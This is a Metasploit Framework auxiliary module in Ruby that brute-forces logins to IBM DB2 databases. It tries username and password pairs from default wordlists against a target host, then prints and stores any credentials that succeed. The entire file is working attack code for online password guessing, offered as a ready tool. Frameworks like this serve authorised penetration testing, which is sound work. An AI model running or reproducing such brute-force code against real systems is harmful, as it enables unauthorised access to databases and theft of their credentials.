##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary
        
	include Msf::Exploit::Remote::DB2
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	
	def initialize
		super(
			'Name'           => 'DB2 Authentication Brute Force Utility',
			'Version'        => '$Revision$',
			'Description'    => %q{This module attempts to authenticate against a DB2
				instance using username and password combinations indicated by the
				USER_FILE, PASS_FILE, and USERPASS_FILE options.},
			'Author'         => ['todb'],
			'License'        => MSF_LICENSE
		)
    
    register_options(
      [
				OptPath.new('USERPASS_FILE',  [ false, "File containing (space-seperated) users and passwords, one pair per line",
          File.join(Msf::Config.install_root, "data", "wordlists", "db2_default_userpass.txt") ]),
				OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
          File.join(Msf::Config.install_root, "data", "wordlists", "db2_default_user.txt") ]),
				OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
          File.join(Msf::Config.install_root, "data", "wordlists", "db2_default_pass.txt") ]),
			], self.class)
      
		# Users must use user/pass/userpass files.
		deregister_options('USERNAME' , 'PASSWORD')
	end

	def run_host(ip)
			each_user_pass { |user, pass|
        do_login(user,pass,datastore['DATABASE'])
			}
	end

	def do_login(user=nil,pass=nil,db=nil)
		verbose = datastore['VERBOSE']
		datastore['USERNAME'] = user
		datastore['PASSWORD'] = pass
		vprint_status("#{rhost}:#{rport} - DB2 - Trying username:'#{user}' with password:'#{pass}'")

		begin
			info = db2_check_login
		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} : Unable to attempt authentication") 
			return :abort
		rescue ::Rex::Proto::DRDA::RespError => e
			vprint_error("#{rhost}:#{rport} : Error in connecting to DB2 instance: #{e}") 
			return :abort
		end
			disconnect

			# Report service state
			report_service(
				:host => rhost,
				:port => rport,
				:name => "db2"
			)

			if info[:db_login_success]
				print_good("#{rhost}:#{rport} - DB2 - successful login for '#{user}' : '#{pass}' against database '#{db}'")
				# Report credentials
				report_auth_info(
					:host => rhost,
					:proto => 'db2',
					:user => user,
					:pass => pass,
					:database => db,
					:targ_host => rhost,
					:targ_port => rport
				)
				return :next_user
			else
				vprint_status("#{rhost}:#{rport} - DB2 - failed login for '#{user}' : '#{pass}' against database '#{db}'")
				return :fail
			end

	end
end
